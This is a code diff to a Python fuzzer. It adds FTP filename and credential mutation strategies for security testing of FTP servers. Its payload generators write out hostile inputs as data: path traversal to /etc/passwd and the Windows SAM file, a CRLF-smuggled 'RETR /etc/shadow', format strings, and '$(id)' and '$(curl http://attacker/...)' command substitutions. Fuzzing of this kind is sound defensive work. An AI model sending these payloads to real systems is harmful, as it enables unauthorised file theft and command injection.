@@ -97,6 +97,8 @@ ALL_STRATEGIES: list[str] = [
     "ftp_token_replace",  # FTP: replace the current command with a different FTP token
     "ftp_arg_fuzz",       # FTP: fuzz the argument after a command token
     "ftp_crlf_insert",    # FTP: inject extra CRLF delimiters
+    "ftp_filename_fuzz",  # FTP: targeted filename/path fuzzing (RETR/STOR/CWD/MKD/...)
+    "ftp_credential_fuzz",# FTP: targeted credential fuzzing (USER/PASS/ACCT)
 ]
 
 # Binary-only strategies (no FTP awareness — used by non-FTP targets).
@@ -256,6 +258,8 @@ class BinaryMutator:
             "ftp_token_replace": self._strat_ftp_token_replace,
             "ftp_arg_fuzz":      self._strat_ftp_arg_fuzz,
             "ftp_crlf_insert":   self._strat_ftp_crlf_insert,
+            "ftp_filename_fuzz":   self._strat_ftp_filename_fuzz,
+            "ftp_credential_fuzz": self._strat_ftp_credential_fuzz,
         }
         fn = dispatch.get(strategy)
         if fn is not None:
@@ -731,6 +735,149 @@ class BinaryMutator:
             else:
                 # Must stay in-place — truncate bad_arg to fit
                 data[arg_start:arg_end] = bad_arg[:arg_len]
+
+    # Command verbs whose argument is a filename/path — the fuzzer exercises
+    # the server's filename/path parser, which runs BEFORE any data-channel
+    # handshake. So single-packet mutation still reaches the parser (black-box:
+    # no 2nd TCP connection needed). Lowercase compare for robustness.
+    _FTP_FILENAME_CMDS: set[bytes] = {
+        b"retr", b"stor", b"appe", b"mkd", b"cwd", b"dele", b"rmd",
+        b"list", b"nlst", b"rnfr", b"rnto", b"site", b"mfmt", b"chmod",
+        b"mdtm", b"size", b"mlsd", b"mlst",
+    }
+    # Command verbs whose argument is a credential.
+    _FTP_CREDENTIAL_CMDS: set[bytes] = {b"user", b"pass", b"acct"}
+
+    def _ftp_locate_arg(self, data: bytearray) -> tuple[int, int]:
+        """Return (arg_start, arg_end) for the FTP command argument region.
+
+        Argument = bytes after the first SPACE (within the first 16 bytes) up
+        to the CRLF/LF line end. Returns (-1, -1) if no argument separator
+        exists, and (arg_start, n) if there's a SPACE but no terminator.
+        Shared by the filename/credential fuzzers (same region logic as
+        _strat_ftp_arg_fuzz).
+        """
+        n = len(data)
+        if n < 5:
+            return -1, -1
+        space_pos = -1
+        crlf_pos = n
+        for i in range(min(n, 16)):
+            if data[i] == 0x20 and space_pos == -1:
+                space_pos = i
+            if i + 1 < n and data[i] == 0x0D and data[i + 1] == 0x0A:
+                crlf_pos = i
+                break
+            if data[i] == 0x0A:
+                crlf_pos = i
+                break
+        if space_pos == -1:
+            return -1, -1
+        return space_pos + 1, crlf_pos
+
+    def _ftp_command_verb(self, data: bytearray, space_pos: int) -> bytes:
+        """Lowercased command verb (bytes before the SPACE)."""
+        return bytes(data[:space_pos]).rstrip().lower()
+
+    def _strat_ftp_filename_fuzz(self, data: bytearray, sr: list[tuple[int, int]], mutable: list[int]) -> None:
+        """Targeted filename/path fuzzing for FTP file commands.
+
+        Replaces the argument of RETR/STOR/MKD/CWD/DELE/... with a
+        filename-focused bad string (path traversal, oversized name, null-in-
+        path, encoded traversal). The filename parser runs before any
+        data-channel handshake, so this reaches the vulnerable code path
+        single-packet. No-op for non-filename commands (other operators
+        handle them).
+        """
+        arg_start, arg_end = self._ftp_locate_arg(data)
+        if arg_start < 0:
+            return
+        verb = self._ftp_command_verb(data, arg_start - 1)
+        if verb not in self._FTP_FILENAME_CMDS:
+            return  # Not a filename command — let other operators handle it.
+
+        bad = self._ftp_fuzz_filename()
+        can_grow = not sr or not any(s > arg_end for s, _ in sr)
+        if arg_start >= arg_end:
+            # No argument yet — inject one if it won't shift static bytes.
+            if not can_grow:
+                return
+            data[arg_start:arg_start] = bad[:MAGIC_MAX_BYTES] + CRLF
+            return
+        if can_grow:
+            data[arg_start:arg_end] = bad[: min(len(bad), MAGIC_MAX_BYTES)] + CRLF
+        else:
+            data[arg_start:arg_end] = bad[:arg_end - arg_start]
+
+    def _strat_ftp_credential_fuzz(self, data: bytearray, sr: list[tuple[int, int]], mutable: list[int]) -> None:
+        """Targeted credential fuzzing for USER/PASS/ACCT.
+
+        Replaces the argument with credential-focused bad strings (oversized
+        username/password, empty, shell/format-string metacharacters). These
+        hit the auth parser — a common buffer-overread/overflow site.
+        """
+        arg_start, arg_end = self._ftp_locate_arg(data)
+        if arg_start < 0:
+            return
+        verb = self._ftp_command_verb(data, arg_start - 1)
+        if verb not in self._FTP_CREDENTIAL_CMDS:
+            return
+
+        bad = self._ftp_fuzz_credential()
+        can_grow = not sr or not any(s > arg_end for s, _ in sr)
+        if arg_start >= arg_end:
+            if not can_grow:
+                return
+            data[arg_start:arg_start] = bad[:MAGIC_MAX_BYTES] + CRLF
+            return
+        if can_grow:
+            data[arg_start:arg_end] = bad[: min(len(bad), MAGIC_MAX_BYTES)] + CRLF
+        else:
+            data[arg_start:arg_end] = bad[:arg_end - arg_start]
+
+    def _ftp_fuzz_filename(self) -> bytes:
+        """Generate a filename/path-focused bad string (≤ MAGIC_MAX_BYTES).
+
+        Filename parsers are classic overflow/traversal/CRLF-injection sites:
+        path traversal, encoded traversal, oversized names, null-in-path,
+        dot/slash floods, and CRLF smuggling to inject a second command.
+        """
+        gens = [
+            lambda: b"../../../../../../etc/passwd",
+            lambda: b"..%2f..%2f..%2fetc%2fpasswd",
+            lambda: b"..\\..\\..\\..\\windows\\system32\\config\\sam",
+            lambda: b"/" * 200 + b"AAAA",
+            lambda: b"." * 200,
+            lambda: b"A" * self._rng.randint(256, 512),  # oversized name (≤ cap)
+            lambda: b"file\x00name.txt",                 # null in path
+            lambda: b"file.txt\r\nRETR /etc/shadow\r\n",  # CRLF command injection
+            lambda: b"%s%s%s%n",                          # format string in name
+            lambda: b"$(id)" + b"\x00" * 4,
+            lambda: b"a" * 64 + b"../../../../" + b"b" * 64,
+            lambda: bytes(self._rng.getrandbits(8) for _ in range(self._rng.randint(8, 64))),
+        ]
+        return self._rng.choice(gens)()
+
+    def _ftp_fuzz_credential(self) -> bytes:
+        """Generate a credential-focused bad string (≤ MAGIC_MAX_BYTES).
+
+        Auth parsers frequently over-read/overflow on long credentials or
+        choke on empty/control/metaspecial values.
+        """
+        gens = [
+            lambda: b"A" * self._rng.randint(256, 512),  # oversized credential
+            lambda: b"",                                  # empty
+            lambda: b"\x00",                              # lone null
+            lambda: b"admin\x00root",
+            lambda: b"%n" * 40,                           # format string
+            lambda: b"$(curl http://attacker/" + b"B" * 32 + b")",
+            lambda: b"'; --",                             # SQL-ish
+            lambda: bytes(range(1, 33)),                  # control chars
+            lambda: b"\xff\xfe" * 32,                     # high bytes / invalid utf
+            lambda: b"user" + b"\r\nPASS " + b"P" * 64,   # split/smuggle
+            lambda: bytes(self._rng.getrandbits(8) for _ in range(self._rng.randint(8, 64))),
+        ]
+        return self._rng.choice(gens)()
 
     def _strat_ftp_crlf_insert(self, data: bytearray, sr: list[tuple[int, int]], mutable: list[int]) -> None:
         """Inject extra CRLF delimiters at random positions.
